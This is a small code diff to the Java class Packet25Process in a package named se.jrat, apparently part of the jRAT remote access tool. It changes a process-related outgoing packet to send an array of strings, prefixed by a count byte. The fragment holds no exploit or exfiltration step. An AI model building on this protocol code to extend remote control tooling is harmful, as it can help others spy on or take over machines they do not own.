@@ -7,15 +7,21 @@ import se.jrat.common.io.StringWriter;
 
 public class Packet25Process extends AbstractOutgoingPacket {
 
-	private String process;
+	private String[] data;
 
-	public Packet25Process(String process) {
-		this.process = process;
+	public Packet25Process(String[] data) {
+		this.data = data;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(process);
+		assert data.length <= Byte.MAX_VALUE;
+		
+		dos.writeByte(data.length);
+		
+		for (int i = 0; i < data.length; i++) {
+			sw.writeLine(data[i]);
+		}
 	}
 
 	@Override
